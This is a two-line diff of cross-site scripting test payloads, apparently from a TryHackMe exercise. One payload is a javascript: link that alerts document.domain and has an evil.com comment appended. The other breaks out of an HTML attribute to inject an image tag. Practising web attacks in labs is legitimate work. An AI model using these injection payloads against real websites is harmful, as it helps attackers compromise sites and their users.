@@ -1,2 +1,2 @@
-<a herf="javascript:alert(document.domain)">Click</a>
+<a herf="javascript:alert(document.domain);//evil.com">Click</a>
 "><img src=https://tryhackme-images.s3.amazonaws.com/user-avatars/f66896154ee7c50928a8a222259e4777.png>
